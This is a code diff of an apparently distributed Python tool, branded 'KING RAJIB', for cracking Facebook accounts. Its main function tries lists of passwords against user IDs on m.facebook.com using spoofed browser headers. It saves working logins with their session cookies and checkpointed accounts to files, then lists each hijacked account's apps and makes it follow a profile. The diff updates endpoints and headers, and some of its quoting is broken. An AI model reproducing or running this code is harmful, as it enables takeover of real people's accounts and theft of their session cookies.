@@ -15,7 +15,7 @@ logo = (""""\033[132
 ██████╔╝░╚███╔╝░
 ██╔══██╗░██╔██╗░
 ██║░░██║██╔╝╚██╗
-╚═╝░░╚═╝╚═╝░░╚═╝
+╚═╝░░╚═╝╚═╝░░╚═╝KING RAJIB
 \033[1;32m╔══════════════════════════════════╗╔════════════════════════╗
 \033[1;32m║NOTE : \033[37;45mTHIS TOOLS IS FREE V4.1\033[0;m\033[1;32m     ║║ \x1b[1;93m╭━━━╮╭╮╭━━━┳╮╱╭┳━━━━╮\033[1;32m   ║
 \033[1;32m║══════════════════════════════════║║ \x1b[1;93m ┃╭━╮┣╯┃┃╭━━┫┃╱┃┃╭╮╭╮┃\033[1;32m ║
@@ -25,7 +25,7 @@ logo = (""""\033[132
 \033[1;32m║══════════════════════════════════║║  \x1b[1;93m╰╯╰━┻━━┻╯╱╱╱╱╱╰╯╱╰╯\033[1;32m   ║
 \033[1;32m║GITHUB    : DK KING RAJIB           ║║                         ║
 \033[1;32m║══════════════════════════════════║║\x1b[1;93m       ᴠᴇʀꜱɪᴏɴ:4.1 \033[1;32m     ║
-\033[1;32m║SERVER    : DATA - WIFI WORKING  ║╚═════════════════════════╝
+\033[1;32m║SERVER    : DATA & WIFI WORKING  ║╚═════════════════════════╝
 \033[1;32m║══════════════════════════════════════════════════════════╗
 \033[1;32m║FACEBOOK : Šiňglê Lífè  ║ কি্ঁং অ্ঁপ্ঁ কি্ঁং
 \033[1;32m║══════════════════════════════════════════════════════════║
@@ -51,7 +51,7 @@ def FD():
     print(' [2] EXIT')
     opt = input('\n  \x1b[1;32m CHOOSE OPTION >>> ')
     if opt == '1':
-        os.system('xdg-open https://https://www.facebook.com/RK.VAI.420')
+        os.system('xdg-open https://www.facebook.com/RK.VAI.420?mibextid=ZbWKwL')
         o()
         return None
     None('\n\x1b[1;31mEXIT\x1b[0;97mx')
@@ -77,7 +77,7 @@ def o():
         os.system('xdg-open https://youtube.com/@ItsRajibKing?si=OSLaP3Uwi4urfq2T')
         return None
     if opt == '4':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=https://RK.VAI.420')
+        os.system('xdg-open https://www.facebook.com/RK.VAI.420?mibextid=ZbWKwL')
         
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
@@ -98,7 +98,7 @@ except ModuleNotFoundError:
     os.system('pip install bs4')
 
 def cek_apk(session,coki):
-    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -110,7 +110,7 @@ def cek_apk(session,coki):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -124,10 +124,10 @@ def cek_apk(session,coki):
             print('')
 
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/Me', {
+        r = BeautifulSoup(session.get('https://m.facebook.com/Me', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://free.facebook.com' + str(get), {
+        session.get('https://m.facebook.com' + str(get), {
             'cookie': coki }, **('cookies',)).text
 
 
@@ -178,7 +178,7 @@ logo = ("""\033[132
 ██████╔╝░╚███╔╝░
 ██╔══██╗░██╔██╗░
 ██║░░██║██╔╝╚██╗
-╚═╝░░╚═╝╚═╝░░╚═╝
+╚═╝░░╚═╝╚═╝░░╚═╝KING RAJIB
 \033[1;32m╔══════════════════════════════════╗╔════════════════════════╗
 \033[1;32m║NOTE : \033[37;45mTHIS TOOLS IS FREE V4.1\033[0;m\033[1;32m     ║║ \x1b[1;93m╭━━━╮╭╮╭━━━┳╮╱╭┳━━━━╮\033[1;32m   ║
 \033[1;32m║══════════════════════════════════║║ \x1b[1;93m ┃╭━╮┣╯┃┃╭━━┫┃╱┃┃╭╮╭╮┃\033[1;32m ║
@@ -188,7 +188,7 @@ logo = ("""\033[132
 \033[1;32m║══════════════════════════════════║║  \x1b[1;93m╰╯╰━┻━━┻╯╱╱╱╱╱╰╯╱╰╯\033[1;32m   ║
 \033[1;32m║GITHUB    : DK KING RAJIB           ║║                         ║
 \033[1;32m║══════════════════════════════════║║\x1b[1;93m       ᴠᴇʀꜱɪᴏɴ:4.1 \033[1;32m     ║
-\033[1;32m║SERVER    : DATA - WIFI WORKING  ║╚═════════════════════════╝
+\033[1;32m║SERVER    : DATA & WIFI WORKING  ║╚═════════════════════════╝
 \033[1;32m║══════════════════════════════════════════════════════════╗
 \033[1;32m║FACEBOOK : Šiňglê Lífè  ║ I LOVE YOU
 \033[1;32m║══════════════════════════════════════════════════════════║
@@ -305,7 +305,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -316,41 +316,42 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'free.facebook.com',
+            header_freefb = {"authority": 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            "accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'referer': 'https://www.google.com/',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"Redmi Y2"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"9.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'cross-site',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '980',}
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m[Rajib-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m[ʀᴀᴊɪʙ]-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/Rajib-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/[ʀᴀᴊɪʙ]-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m[Rajib-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/Rajib-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('    \33[1;30m[ʀᴀᴊɪʙ]-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/[ʀᴀᴊɪʙ]-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
